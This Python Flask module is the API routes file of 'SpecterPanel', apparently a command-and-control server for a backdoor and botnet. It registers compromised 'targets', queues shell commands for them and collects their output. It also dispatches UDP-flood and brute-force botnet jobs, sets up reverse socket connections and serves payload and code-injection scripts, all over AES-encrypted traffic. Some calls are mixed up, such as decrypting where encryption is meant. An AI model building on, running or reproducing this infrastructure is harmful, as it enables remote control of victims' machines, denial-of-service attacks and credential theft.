# -*- coding: utf-8 -*-
"""
SpecterPanel - API Routes
This module defines the API routes for the SpecterPanel application.
These routes handle various API requests related to command execution,
target registration, and instruction retrieval.
It includes routes for receiving commands from backdoors,
saving command outputs, managing botnets, and handling socket connections.
It uses Flask's Blueprint to organize the API routes and SQLAlchemy for database interactions.
Routes are defined for:
- Receiving and executing commands from backdoors
- Saving command outputs from targets
- Retrieving botnet information for targets
- Registering new targets with the API
- Retrieving instructions for targets
- Managing socket connections for targets
This module also includes error handling and logging for API requests.
Routes list:
- /api/ApiCommand/<target_name>: Receives commands from backdoors
- /api/Apicommand/save_output: Saves command outputs from targets
- /api/BotNet/<target_name>: Retrieves botnet information for targets
- /api/registor_target: Registers new targets with the API
- /api/get_instraction/<target_name>: Retrieves instructions for targets
- /api/socket/<target_name>: Manages socket connections for targets
"""

from flask import Blueprint, jsonify, request
from sqlalchemy.orm import sessionmaker
from datetime import datetime
from Crypto.Cipher import AES
import traceback
import base64
import json
import os

from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instruction_Detail
from db.mange_db import config, _create_engine
from utility.email_temp import email_temp
from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output, clean_ANSI_escape_text


emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

api = Blueprint('api', __name__)


def encrypt_payload(payload):
    """
    Encrypts a Python dictionary payload using AES encryption.
    Args:
        payload (dict): The payload to encrypt.
    Returns:
        dict: A dictionary containing the encrypted payload with nonce, ciphertext, and tag.
    """
    payload_json = json.dumps(payload).encode()

    clipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX)
    ciphertext, tag = clipher.encrypt_and_digest(payload_json)

    return {
        'nonce': base64.b64encode(clipher.nonce).decode(),
        'ciphertext': base64.b64encode(ciphertext).decode(),
        'tag': base64.b64encode(tag).decode()
    }

def decrypt_payload(encrypted_data):
    """
    Decrypts an encrypted payload using AES decryption.
    Args:
        encrypted_data (dict): A dictionary containing the encrypted payload with nonce, ciphertext, and tag.
    Returns:
        dict: The decrypted payload as a Python dictionary.
    """
    # Decode Base64 values back to bytes
    nonce = base64.b64decode(encrypted_data['nonce'])
    ciphertext = base64.b64decode(encrypted_data['ciphertext'])
    tag = base64.b64decode(encrypted_data['tag'])

    # Create cipher with the same key and nonce
    cipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX, nonce=nonce)
    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

    # Convert bytes back to JSON/dict
    print("decripting...", decrypted_data.decode())
    return json.loads(decrypted_data.decode())


# recive excute command from the backdoor
@api.route('/api/ApiCommand/<target_name>')
def apiCommand(target_name):
    """
    API endpoint to receive and execute commands from the backdoor.
    Args:
        target_name (str): The name of the target for which commands are being requested.
    Returns:
        JSON response containing all commands for the target if the API token is valid.
        If the API token is invalid or not provided, returns an error message.
    """
    if request.method == 'GET':
        try:
            data = decrypt_payload(request.args)

            api_token = data.get('token')
            IP = data.get('ip')
            opreatingSystem = data.get('os')
            valid = getlist(_session.query(ApiToken).filter_by(token=api_token).all(), sp=',')

            if valid:
                apiCommand = getlist(_session.query(APICommand).filter_by(
                        target_name=target_name,
                        condition=config.STUTAS[1],
                        update = config.CHECK_UPDATE[1]
                    ).all(),
                    sp=',',
                )
                print(apiCommand)
                if IP != readFromJson('target-info', target_name)['ip']:
                    update_target_info(target_name, IP, opreatingSystem)
                return jsonify(encrypt_payload({'allCommand': apiCommand})), 200
            else:
                return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            _session.rollback()
            return jsonify(encrypt_payload({'error': 'Server side Error'})), 500
        finally:
            _session.close()
    else:
        return jsonify(encrypt_payload({'Error': 'Unsupported method'})), 405


@api.route('/api/Apicommand/save_output', methods=['POST'])
def save_output():
    """API endpoint to save command outputs from targets.
    This endpoint receives command outputs from targets and updates the database accordingly.
    It checks the validity of the provided token and target name, updates the command status,
    and saves the output to the database.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target for which outputs are being saved.
        output (list): The list of command outputs to be saved.
        ip (str): The IP address of the target.
        os (str): The operating system of the target.
    Returns:
        JSON response indicating success or failure.
    If the token and target name are valid, it returns a success message.
    If the token or target name is invalid, it returns an error message.
    """
    if request.method == 'POST':
        try:
            data = decrypt_payload(request.json)

            token = data.get('token')
            target_name = data.get('target_name')
            IP = data.get('ip')
            valid = getlist(_session.query(Targets).filter_by(target_name=target_name, token=token).all(), sp=',')

            if len(valid) != 0:
                outputs = data.get('output')
                opreatingSystem = data.get('os')

                for output in outputs:
                    update_output(target_name, output[0], output[1])
                    _session.query(APICommand).filter_by(ID=output[0]).update(
                        {
                            'condition': config.STUTAS[0],
                        }
                    )
                    _session.commit()

                if IP != readFromJson('target-info', target_name)['ip']:
                    update_target_info(target_name, IP, opreatingSystem)

                return jsonify(encrypt_payload({'message': 'Outputs were saved'})), 200
            else:
                return jsonify(encrypt_payload({'Error': 'Invalid token or target'})), 403
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
    else:
        return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405


@api.route('/api/BotNet/<target_name>')
def BotNet(target_name):
    """
    API endpoint to retrieve botnet information for a given target.
    This endpoint allows a target to fetch its botnet instructions based on a valid API token.
    It retrieves botnet details from the database and returns them in a structured format.
    Args:
        target_name (str): The name of the target for which botnet information is being requested.
    Returns:
        JSON response containing botnet information for the target if the API token is valid.
        If the API token is invalid or not provided, returns an error message.
    Explanation: This endpoint fetches botnet instructions for a target.
    Example response:
    {
        "botNets": {
            "udp-flood": {
                "condition": "inprogress",
                "threads": 10
            },
            "bruteForce": {
                "condition": "inprogress",
                "threads": 5,
                "username": "username",
                "password": "password"
            }
        }
    }
    """
    if request.method == 'GET':
        try:
            data = decrypt_payload(request.args)
            token = data.get('token')
            api_token = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
            if len(api_token) == 0:
                return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
            botNets = getlist(_session.query(APILink).filter_by(target_name=target_name).all())
            response = {'botNets': {}}
            for botNet in botNets:
                _session.query(APILink).filter_by(ID=botNet[0]).update(
                    {
                        'condition': config.BOTNET_STATUS[1], 
                    }
                )
                if botNet[4] == config.ACTION_TYPE[0]: # udp-flood
                    response['botNets'] = {
                        config.ACTION_TYPE[0]: {
                            'link': botNet[3],
                            'condition': config.BOTNET_STATUS[1],
                            'threads': botNet[7]
                        }
                    }
                elif botNet[4] == config.ACTION_TYPE[2]: # brutForce
                    response['botNets'] = {
                        config.ACTION_TYPE[0]: {
                            'link': botNet[3],
                            'condition': config.BOTNET_STATUS[1],
                            'threads': botNet[7],
                            'username': botNet[8], # filled name
                            'password': botNet[9]  # filled name
                        }
                    }
            _session.commit()
            return jsonify(encrypt_payload(response)), 200
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            _session.rollback()
            return jsonify(encrypt_payload({'Error': 'Invalid api_token or no api token provided'})), 404
        finally:
            _session.close()
    else:
        return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405


@api.route('/api/registor_target', methods=['POST'])
def registor_target():
    """API endpoint to register a new target with the API.
    This endpoint allows a new target to be registered by providing an API token,
    target name, IP address, and operating system.
    Args:
        token (str): The API token for authentication.
        target_name (str): The name of the target to be registered.
        ip (str): The IP address of the target.
        os (str): The operating system of the target.
    Returns:
        JSON response indicating success or failure.
        If the API token is valid and the target is registered successfully, it returns the target name.
        If the API token or target name is invalid or not provided, it returns an error message.
    """
    if request.method == 'POST':
        try:
            data = decrypt_payload(request.json)

            apitoken = data.get('token')
            target_name = data.get('target_name')
            IP = data.get('ip')
            opratingSystem = data.get('os')

            if not apitoken or not target_name:
                return jsonify(encrypt_payload({'Error': 'Token or target_name not provided'})), 400

            valid = getlist(_session.query(ApiToken).filter_by(token=apitoken).all(), sp=',')
            if len(valid) != 0:
                target_name = target_name + str(datetime.now()).replace(' ', '')
                target = Targets(config.ID(), target_name, valid[0][2].replace(' ', ''), apitoken)
                _session.add(target)
                _session.commit()
                update_target_info(target_name, IP, opratingSystem)

                botNet = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[2], config.STUTAS[1])
                sock = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[1], config.STUTAS[1])
                web = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[0], config.STUTAS[1])

                _session.add(botNet)
                _session.add(sock)
                _session.add(web)
                _session.commit()

                return jsonify(encrypt_payload({'target_name': target_name})), 200
            else:
                return jsonify(encrypt_payload({'Error': 'Invalid api_token'})), 403
        except Exception as e:
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500
        finally:
            _session.close()
    return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provide target name"})), 405


@api.route('/api/get_instraction/<target_name>')
def instarction(target_name):
    """
    API endpoint to retrieve instructions for a given target.
    explanation: This endpoint allows a target to fetch its instructions
                based on a valid API token. It retrieves both system and user-specific instructions
                from the database and returns them in a structured format.
    Args:
        target_name (str): The name of the target for which instructions are being requested.
    Returns:
        JSON response containing instructions for the target if the API token is valid.
        If the API token is invalid or not provided, returns an error message.
    
    Note: The response includes:
    - instraction: The main instruction for the target.
    - Delay: The delay associated with the instruction.
    - user_instarcton: A dictionary of user-specific instructions categorized by type (CMD, Web, Socket).
    - sys_instraction: A dictionary of system instructions, including socket and botnet details.
    Example response:
    {
        "instraction": "connectBySocket",
        "Delay": 15,
        "user_instarcton": {
            "CMD": ["command1", "command2"],
            "Web": "http://example.com",
            "Socket": {"host": "localhost", "port": 8080}
        },
        "sys_instraction": {
            "socket": {"host": "socket_host", "port": 1234},
            "botnet": {"udp-flood": {"host": "botnet_host", "port": 80}, "bruteForce": {"host": "botnet_host", "thread": 10}}
        }
    }
    """
    if request.method == 'GET':
        try:

            user_email = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')[0][2]
            

            data = decrypt_payload(request.args)

            token = data.get('token')
            print("token:", token)
            if len(token) == 0:
                return jsonify(encrypt_payload({'error': 'please provide a valid api token. currently no api token provided'})), 403
            IP = data.get('ip')
            opratingSystem = data.get('os')
            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
            print("valid:", valid)
            instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, status=config.STUTAS[0]).all(), sp=',')
            user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')

            if len(valid) != 0 and len(instraction) != 0:
                print(len(instraction), instraction)
                
                user_instraction = {
                    'instraction': instraction[0][3],
                    'Delay': instraction[0][1],
                    'user_instarcton':{},
                    'sys_instraction': {}
                }
                
                if len(user_instractions) != 0:
                    user_ins = {
                        'CMD': [],
                    }
                    for ins in user_instractions:
                        if ins[3] == config.INSTRACTION_TYPE[0]:  # CMD
                            commands = ins[2]
                            user_ins['CMD'].append(commands)

                        elif ins[3] == config.INSTRACTION_TYPE[2]:  # CodeInjection
                            # TODO: handle code injection if needed
                            pass
                        elif ins[3] == config.INSTRACTION_TYPE[3]:  # Web
                            if ins[3] == target_name:
                                user_ins['Web'] = ins[2]
                        elif ins[3] == config.INSTRACTION_TYPE[4]:  # Socket
                            if ins[3] == target_name:
                                user_ins['Socket'] = {
                                    'host': ins[6],
                                    'port': ins[5]
                                }
                        elif ins[3].split(',')[0] == config.INSTRACTION_TYPE[1]:  # BotNet
                            if ins[0]:
                                user_ins['BotNet'] = {ins[3]: [ data for data in ins if data not in config.INSTRACTION_BOTNET_CATEGORY ]}
                    user_instraction['user_instarcton'] = user_ins
           

                if len(user_instractions) != 0:
                    if IP != readFromJson('target-info', target_name)['ip']:
                        update_target_info(target_name, IP, opratingSystem)
                    if instraction[0][3] == config.INSTRACTION[1]:  # connectBySocket
                        socket_info = getlist(_session.query(APILink).filter_by(target_name=target_name, action_type=config.ACTION_TYPE[1]).all(), sp=',')[0]
                        user_instraction['sys_instraction'] = {
                            'socket':{
                                'host': socket_info[3],
                                'port': socket_info[6]
                            }
                        }
                    return jsonify(encrypt_payload(user_instraction)), 200
                if len(instraction) == 0:
                    return jsonify(encrypt_payload({'Message': 'No instraction found'})), 404
                else:
                    return jsonify(encrypt_payload(user_instraction)), 200
            else:
                print('------ api_token:', token, valid)
                return jsonify(encrypt_payload({'Error': 'Invalid api_token. please provide a valid api token'})), 403
        
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
            return jsonify(encrypt_payload({'Error': f'Exception {str(e)}'})), 500
    else:
        return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405



@api.route('/api/lib/<usePayload>', methods=['GET'])
def lib(usePayload):
    """
    Endpoint to serve static files from the specified path.
    This endpoint is used to send files like JavaScript libraries or other static resources.
    Args:
        usePayload (str): The name of the file to be served, formatted in the config.file_path.
    Returns:
        Response: The file is sent as an attachment if it exists, otherwise an error message is returned.
    """
    try:
        data = decrypt_payload(request.json)

        if request.method == 'GET':
            token = data.get('token')
            if not token:
                return jsonify({'Error': 'Token not provided'}), 400
            opratingSystem = data.get('os')
            ip = data.get('ip')
            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
            if len(valid) == 0:
                return jsonify({'Error': 'Invalid token'}), 403
            file_path = config.file_path.format(usePayload)
            if os.path.exists(file_path):
                log(f'[ROUT] : {request.endpoint} file: {file_path} is being sent')
                update_target_info(valid[0][2], ip, opratingSystem)
                with open(file_path, "r", encoding="utf-8") as f:
                    script_text = f.read()
                return jsonify(decrypt_payload({'script': script_text}))
            else:
                log(f'[ERROR ROUT] : {request.endpoint} error: File not found {file_path}')
                return jsonify(encrypt_payload({'Error': 'File not found'})), 404
        else:
            return jsonify(encrypt_payload({'Error': "Unsupported method"})), 405
    except Exception as e:
        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
        return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500


@api.route('/api/injection/<target_name>', methods=['GET', 'POST'])
def injection(target_name):
    """
    API endpoint to retrieve or save a Python script for a given target.
    GET: Returns the script as plain text if found and token is valid.
    POST: Saves the script output (not implemented here, just a placeholder).
    Args:
        target_name (str): The name of the target to retrieve or save for.
    Returns:
        JSON response with message or script text, or error message.
    """
    try:
        data = decrypt_payload(request.args)

        token = data.get('token') if request.method == 'GET' else data.get('token')
        ip = data.get('ip') if request.method == 'GET' else data.get('ip')
        os_type = data.get('os') if request.method == 'GET' else data.get('os')

        update_target_info(target_name, ip, os_type)
        valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
        if not valid:
            return jsonify({'message': 'invalid'}), 403

        if request.method == 'GET':
            script_path = config.file_path.format(f"{target_name}.py")
            if os.path.exists(script_path):
                with open(script_path, "r", encoding="utf-8") as f:
                    script_text = f.read()
                return jsonify(decrypt_payload({'script': script_text})), 200
            else:
                return jsonify(encrypt_payload({'message': 'Script not found'})), 404

        elif request.method == 'POST':
            update_code_output(target_name, request.json.get('code_output'))
            return jsonify(encrypt_payload({'message': 'Output saved (not implemented)'})), 200

        return jsonify(encrypt_payload({'message': 'invalid method'})), 405

    except Exception as e:
        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
        return jsonify(encrypt_payload({'message': 'Error'})), 500
